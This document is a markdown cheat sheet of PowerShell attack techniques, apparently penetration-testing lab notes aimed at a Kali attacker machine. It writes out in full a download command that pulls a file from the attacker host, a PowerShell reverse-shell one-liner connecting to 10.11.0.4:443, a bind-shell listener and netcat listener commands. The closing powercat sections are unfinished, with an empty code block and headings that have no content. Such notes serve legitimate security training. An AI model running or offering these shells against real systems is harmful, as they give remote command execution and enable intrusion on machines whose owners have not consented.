## Powershell

### Powershell File Transfers
Transfer file from **target** to **Kali** machine: 

1. Setup webserver on Kali machine:
```bash
python3 -m http.server 80
```

2. Grab download from target:
```powershell
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
```
*NOTE: Change the `http://10.11.0.4/wget.exe` parameter with desired IP address of the **Kali machine** and the destination parameter `C:\Users\offsec\Desktop\wget.exe` with desired destination*


### Powershell Reverse Shells
Reverse Shell from **target** to **Kali** machine:
1. Setup listener on Kali Machine: 
```bash
sudo nc -nvlp $PORT
```

2. Run PowerShell code on target machine:
```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
*NOTE: Change the `10.11.0.4` and `443` parameters with desired IP address and port of the **Kali machine** and **listening port***

### PowerShell Bind Shells
1. Setup powershell listener on target on port **443**. Feel free to change port

```powershell
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```
2. Connect to target machine from Kali machine:
```bash
nc -nv $TARGET_IP $PORT
```
### Powercat installation
Install `powercat` on Kali machine:
```bash
sudo apt install powercat
```
Powercat is located in `usr/share/windows-resources/powercat`

Transfer `powercat` to target machine using methods found [here]()

## Powercat File Transfers
```bash

```

### Powercat Bind Shells
Import `powercat` in powershell:
```powershell
import-module .\powercat.ps1
```

### Powercat Reverse Shells

### Powercat 
